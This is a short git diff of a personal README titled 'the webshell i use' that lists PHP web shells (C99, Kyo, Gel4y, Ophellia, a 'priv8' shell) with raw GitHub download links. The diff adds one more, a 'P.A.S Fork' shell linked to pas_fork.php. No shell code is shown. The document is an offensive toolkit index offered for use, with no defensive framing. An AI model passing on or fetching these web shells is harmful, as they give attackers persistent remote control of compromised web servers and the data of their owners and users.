@@ -2,6 +2,7 @@
 # liiuxii 💕
 * the webshell i use
 
+* P.A.S Fork [PaS]
 * Gel4y shell [g4y]
 * Kyo mini shell [kyo]
 * C99 shell [C99]
@@ -12,7 +13,7 @@
 * Ophellia shell [OPL]
 * Ngiiix1337 priv8 Shell [PRIV]
 
-
+[PaS]: https://raw.githubusercontent.com/liiuxii/zxc/main/pas_fork.php
 [g4y]: https://raw.githubusercontent.com/liiuxii/zxc/main/bypass403.php
 [kyo]: https://raw.githubusercontent.com/liiuxii/zxc/main/kyo.php
 [C99]: https://raw.githubusercontent.com/liiuxii/zxc/main/c99.php
